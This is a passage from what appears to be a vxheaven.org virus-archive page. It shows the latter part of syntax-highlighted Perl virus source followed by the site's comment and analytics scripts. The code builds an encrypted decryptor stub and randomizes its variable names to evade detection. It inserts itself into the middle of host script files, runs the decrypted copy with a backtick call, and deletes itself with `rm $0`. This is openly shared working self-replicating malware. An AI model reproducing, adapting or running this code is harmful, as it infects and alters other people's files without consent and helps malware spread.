&nbsp; &nbsp; &nbsp;<span style="color: #0000ff;">@Vir</span><span style="color: black;">&#91;</span><span style="color: #cc66cc;">3</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">&quot;for ( <span style="color: #000099; font-weight: bold;">\$</span>lll = 0<span style="color: #000099; font-weight: bold;">\;</span> <span style="color: #000099; font-weight: bold;">\$</span>lll &lt; (<span style="color: #000099; font-weight: bold;">\@</span>ll1)<span style="color: #000099; font-weight: bold;">\;</span> <span style="color: #000099; font-weight: bold;">\$</span>lll++ ) { &quot;</span><span style="color: #339933;">;</span> &nbsp;<span style="color: black; font-style: italic;"># Decrypt Loop</span><br/>
<br/>
&nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span> <span style="color: #0000ff;">$crypttype</span> <span style="color: #339933;">==</span> <span style="color: #cc66cc;">0</span> <span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">@Vir</span><span style="color: black;">&#91;</span><span style="color: #cc66cc;">4</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">&quot; <span style="color: #000099; font-weight: bold;">\$</span>l11 .= chr(<span style="color: #000099; font-weight: bold;">\@</span>ll1[<span style="color: #000099; font-weight: bold;">\$</span>lll] <span style="color: #000099; font-weight: bold;">\/</span> <span style="color: #000099; font-weight: bold;">\$</span>11l)<span style="color: #000099; font-weight: bold;">\;</span>&quot;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># Decrypt Char</span><br/>
&nbsp; &nbsp; &nbsp;<span style="color: black;">&#125;</span> <span style="color: #b1b100;">else</span> <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">@Vir</span><span style="color: black;">&#91;</span><span style="color: #cc66cc;">4</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">&quot; <span style="color: #000099; font-weight: bold;">\$</span>l11 .= chr(<span style="color: #000099; font-weight: bold;">\@</span>ll1[<span style="color: #000099; font-weight: bold;">\$</span>lll]-<span style="color: #000099; font-weight: bold;">\$</span>11l)<span style="color: #000099; font-weight: bold;">\;</span>&quot;</span><span style="color: #339933;">;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># Decrypt Char</span><br/>
&nbsp; &nbsp; &nbsp;<span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp;<span style="color: #0000ff;">@Vir</span><span style="color: black;">&#91;</span><span style="color: #cc66cc;">5</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">&quot;}&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp;<span style="color: #0000ff;">@Vir</span><span style="color: black;">&#91;</span><span style="color: #cc66cc;">6</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">&quot;open(1l1, <span style="color: #000099; font-weight: bold;">\&quot;</span>&gt;$filename<span style="color: #000099; font-weight: bold;">\&quot;</span>)<span style="color: #000099; font-weight: bold;">\;</span>&quot;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># write encrypted</span><br/>
&nbsp; &nbsp; &nbsp;<span style="color: #0000ff;">@Vir</span><span style="color: black;">&#91;</span><span style="color: #cc66cc;">7</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">&quot;print 1l1 <span style="color: #000099; font-weight: bold;">\$</span>l11<span style="color: #000099; font-weight: bold;">\;</span>&quot;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># string to a file</span><br/>
&nbsp; &nbsp; &nbsp;<span style="color: #0000ff;">@Vir</span><span style="color: black;">&#91;</span><span style="color: #cc66cc;">8</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">&quot;close(1l1)<span style="color: #000099; font-weight: bold;">\;</span>&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp;<span style="color: #0000ff;">@Vir</span><span style="color: black;">&#91;</span><span style="color: #cc66cc;">9</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">&quot;<span style="color: #000099; font-weight: bold;">\$</span>lll = <span style="color: #000099; font-weight: bold;">\`</span>perl $filename<span style="color: #000099; font-weight: bold;">\`</span>;<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># and start it</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># change variables</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># $Virus File @Virus $X &nbsp;$Key $Vir</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># l1l &nbsp; &nbsp;1l1 &nbsp;ll1 &nbsp; &nbsp;lll 11l &nbsp;l11</span><br/>
&nbsp; &nbsp; <span style="color: #0000ff;">@vars</span> <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;l1l&quot;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;1l1&quot;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;ll1&quot;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;lll&quot;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;11l&quot;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;l11&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> <span style="color: black; font-style: italic;"># replace the variables</span><br/>
&nbsp; &nbsp; <span style="color: #b1b100;">foreach</span> <span style="color: #0000ff;">$replace</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">@vars</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp;<span style="color: #0000ff;">$newVar</span> <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/chr.html"><span style="color: #000066;">chr</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/int.html"><span style="color: #000066;">int</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/rand.html"><span style="color: #000066;">rand</span></a><span style="color: black;">&#40;</span><span style="color: #cc66cc;">25</span><span style="color: black;">&#41;</span><span style="color: #339933;">+</span><span style="color: #cc66cc;">65</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># with a letter</span><br/>
&nbsp; &nbsp; &nbsp;<span style="color: #0000ff;">$newVar</span> <span style="color: #339933;">.=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/int.html"><span style="color: #000066;">int</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/rand.html"><span style="color: #000066;">rand</span></a><span style="color: black;">&#40;</span><span style="color: #cc66cc;">65535</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># and a random number</span><br/>
&nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span> <span style="color: #0000ff;">$b</span><span style="color: #339933;">=</span><span style="color: #cc66cc;">0</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$b</span> <span style="color: #339933;">&lt;</span> <span style="color: #0000ff;">@Vir</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$b</span><span style="color: #339933;">++</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">@Vir</span><span style="color: black;">&#91;</span><span style="color: #0000ff;">$b</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=~</span> <span style="color: #009966; font-style: italic;">s/$replace/$newVar/g</span> <span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp;<span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
<br/>
<br/>
&nbsp; &nbsp; <span style="color: #b1b100;">do</span> <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/chomp.html"><span style="color: #000066;">chomp</span></a> <span style="color: #0000ff;">@Temp</span><span style="color: black;">&#91;</span><span style="color: #cc66cc;">0</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">@Temp</span><span style="color: black;">&#91;</span><span style="color: #cc66cc;">0</span><span style="color: black;">&#93;</span> <span style="color: #339933;">.=</span> <span style="color: #ff0000;">&quot; <span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <span style="color: black;">&#125;</span> <span style="color: #b1b100;">until</span><span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/length.html"><span style="color: #000066;">length</span></a><span style="color: black;">&#40;</span><span style="color: #0000ff;">@Temp</span><span style="color: black;">&#91;</span><span style="color: #cc66cc;">0</span><span style="color: black;">&#93;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">%</span> <span style="color: #cc66cc;">5</span><span style="color: black;">&#41;</span> <span style="color: #339933;">==</span> <span style="color: #cc66cc;">0</span> <span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
<br/>
&nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/open.html"><span style="color: #000066;">open</span></a><span style="color: black;">&#40;</span>File<span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;&gt;$FileName&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># and write the infected</span><br/>
&nbsp; &nbsp; <span style="color: #0000ff;">$Temp</span> <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/join.html"><span style="color: #000066;">join</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span> <span style="color: #0000ff;">@Vir</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp;<br/>
&nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span> <span style="color: #0000ff;">$X</span> <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">@Temp</span><span style="color: black;">&#41;</span> <span style="color: #339933;">&gt;&gt;</span> <span style="color: #cc66cc;">1</span> <span style="color: black;">&#41;</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$X</span> <span style="color: #339933;">&lt;</span> <span style="color: #0000ff;">@Temp</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$X</span><span style="color: #339933;">++</span> <span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span> <span style="color: #0000ff;">@Temp</span><span style="color: black;">&#91;</span><span style="color: #0000ff;">$X</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=~</span> <span style="color: #ff0000;">&quot;<span style="color: #000099; font-weight: bold;">\;</span><span style="color: #000099; font-weight: bold;">\n</span>&quot;</span> <span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># insert virus in the middle</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$Temp2</span> <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/join.html"><span style="color: #000066;">join</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;&quot;</span><span style="color: #339933;">,</span> <span style="color: #0000ff;">@Temp</span><span style="color: black;">&#91;</span><span style="color: #cc66cc;">0</span><span style="color: #339933;">..</span><span style="color: #0000ff;">$X</span><span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># write first part </span><br/>
&nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> File <span style="color: #0000ff;">$Temp2</span><span style="color: #339933;">;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># and virus</span><br/>
&nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> File <span style="color: #0000ff;">$Temp</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$X</span><span style="color: #339933;">++;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$Y</span> <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">@Temp</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$Temp2</span> <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/join.html"><span style="color: #000066;">join</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;&quot;</span><span style="color: #339933;">,</span> <span style="color: #0000ff;">@Temp</span><span style="color: black;">&#91;</span><span style="color: #0000ff;">$X</span><span style="color: #339933;">..</span><span style="color: #0000ff;">$Y</span><span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># insert rest of the file</span><br/>
&nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> File <span style="color: #0000ff;">$Temp2</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/goto.html"><span style="color: #000066;">goto</span></a> CloseFile<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp;<span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp;<br/>
&nbsp; &nbsp; &nbsp;<span style="color: #0000ff;">$Temp2</span> <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/join.html"><span style="color: #000066;">join</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;&quot;</span><span style="color: #339933;">,</span> <span style="color: #0000ff;">@Temp</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># no possibility to insert virus</span><br/>
&nbsp; &nbsp; &nbsp;<a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> File <span style="color: #0000ff;">$Temp</span><span style="color: #339933;">;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># file back to disk</span><br/>
&nbsp; &nbsp; &nbsp;<a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> File <span style="color: #0000ff;">$Temp2</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># without EPO</span><br/>
<br/>
<br/>
CloseFile<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp;<a style="color: #000060;" href="http://perldoc.perl.org/functions/close.html"><span style="color: #000066;">close</span></a><span style="color: black;">&#40;</span>File<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp;<span style="color: black;">&#125;</span><span style="color: black;">&#125;</span><span style="color: black;">&#125;</span><span style="color: black;">&#125;</span><br/>
<br/>
&nbsp;<span style="color: #0000ff;">$a</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">`rm $0`</span><span style="color: #339933;">;</span> &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># delete our selves..</span><br/>
&nbsp;</div>
<div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vsn10">de</a><a href="/lib/index.php?lang=en&amp;id=vsn10">en</a><a href="/lib/index.php?lang=es&amp;id=vsn10">es</a><a href="/lib/index.php?lang=it&amp;id=vsn10">it</a><a href="/lib/index.php?lang=fr&amp;id=vsn10">fr</a><a href="/lib/index.php?lang=pl&amp;id=vsn10">pl</a><a href="/lib/index.php?lang=ru&amp;id=vsn10">ru</a><a href="/lib/index.php?lang=ua&amp;id=vsn10">ua</a></div>
</body>
</html>
